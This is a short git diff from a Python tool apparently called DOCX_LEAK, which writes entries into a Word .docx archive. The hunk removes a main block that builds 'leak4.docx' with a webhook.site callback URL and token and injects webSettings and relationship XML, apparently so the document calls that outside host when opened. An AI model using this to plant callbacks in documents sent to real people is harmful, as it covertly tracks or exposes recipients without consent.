@@ -82,10 +82,3 @@ class DOCX_LEAK:
         with zipfile.ZipFile(self.docx_path, mode='a', compression=zipfile.ZIP_DEFLATED) as zf:
             zf.writestr(filename, data)
             #zf.close()
- 
-
-
-if __name__ == "__main__":
-    dxl = DOCX_LEAK("leak4.docx","http://webhook.site/","3d33af52-8319-4073-9fb0-a088a6f234c6")
-    dxl.write_word_webSettings_xml()
-    dxl.write__word__rels_document_xml_rels()
